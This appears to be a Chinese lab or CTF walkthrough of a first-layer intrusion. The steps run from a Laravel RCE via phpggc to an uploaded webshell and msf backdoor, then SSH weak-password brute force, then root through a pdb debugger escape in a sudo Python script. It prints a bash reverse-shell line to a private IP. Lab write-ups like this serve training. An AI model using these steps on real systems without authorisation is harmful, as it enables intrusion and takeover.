## 3.1 第一层

`nmap`端口扫描

![](../Images/ba4edc0e92b23b86d31e4f6dbc259acf.png "null")

看到`80`端口开放的`Laravel`

![](../Images/56faf773a31632b1d33765b0e944c59e.png "null")

寻找了多个`EXP`之后，终于找到一个能用的：将脚本文件和`phpggc`这个脚本放在同一级目录下

```
phpgcc：https:
```

![](../Images/b7fe80f76754fc0866bc462f2ca92445.png "null")

使用方法就是使用`python3 exp.py "system('id')"`，里面的IP需要改成攻击的IP

![](../Images/94831cf23135f8c4264afd1b6363466f.png "null")

测试反弹`shell`不成功

> bash -i >& /dev/tcp/192.168.0.107/6666 0>&1

`pwd`也是在当前目录

![](../Images/463020f33b82ff889c91dee6e2e49a6e.png "null")

开启的是`PHP+Apache`环境，`linux`下`apache`的默认路径 `/var/www/html`，看到了存在`laravel`的压缩包

![](../Images/c83065ee947592f8aefcf24dffc90f4e.png "null")

直接看到`public`下的入口文件`index.php`

![](../Images/8648a9692f7f036d17a3172d16212aa1.png "null")

本来想在这里写入一句话木马，先把`index.php`备份了一下

```
python3 Laravel_CVE-
```

![](../Images/1d2937691f28aac53a22f1de16797c8c.png "null")

但是发现存在过滤，导致写入失败

![](../Images/f1d33a6ca97838e1c592e16126625090.png "null")

所以直接使用`wget`命令下载了一个冰蝎马上去，连接成功：

```
python3 Laravel_CVE-
```

![](../Images/c7d2cd7f66ad90c6f23317cc02b8632b.png "null")

直接上传一个`msf`的`elf`后门上去，`msf`还是挺好用的。接下来就是提权

![](../Images/e0267390b30d647be22662cdce692e79.png "null")

然后使用`suggester`脚本搜索提权的漏洞，这里搜索到一个：

![](../Images/c45d08c554375e27e9a5ac055c8d2355.png "null")

但是尝试攻击之后，发现并没有攻击成功或者说是没有`session`返回

![](../Images/eb03383357cacb84f3d71247352e26bf.png "null")

![](../Images/9d8658923834d154851ce5bd1e68877e.png "null")

来到`cat/ etc/passwd`来确认，确实存在这个用户：

![](../Images/cf34e14107bd3d9672f84fc7f8904fe1.png "null")

使用工具来进行爆破，在一开始的端口扫描发现是存在`ssh`的`vulntarge`存在弱密码：

![](../Images/4e123bafb881aaec4a7e9c0766fbbd8c.png "null")

![](../Images/75383294b89a466b350e033f1a793ad2.png "null")

使用`sudo -l`查看哪些文件是可以使用root权限执行的，在`/opt/root.py`存在一个`python`文件

![](../Images/b9b6df37e6abc2527407a1efa56b76e9.png "null")

这个`pdb`漏洞不是太懂，看了作者的文章：这个脚本就是开启一个监听器，需要输入密码才能进入选项进行相应的选项。这里没有添加`else`，如果使用了非数字会进入调试器，在调试器中就可以执行`python`命令

![](../Images/a97213eba43e983034fc8f4e217d6ff1.png "null")

这里忘记截图了，就是说`sudo root.py`之后在ssh进入一个新的，或者`nc 192.168.0.120 port`生成的端口，接着输入一个非数字，就会进入如下界面。可以执行`os.system('id')`命令是`root` 尝试反弹shell和执行后门文件都不行，所以我直接写入一个root用户，查看`/etc/passwd`写入成功
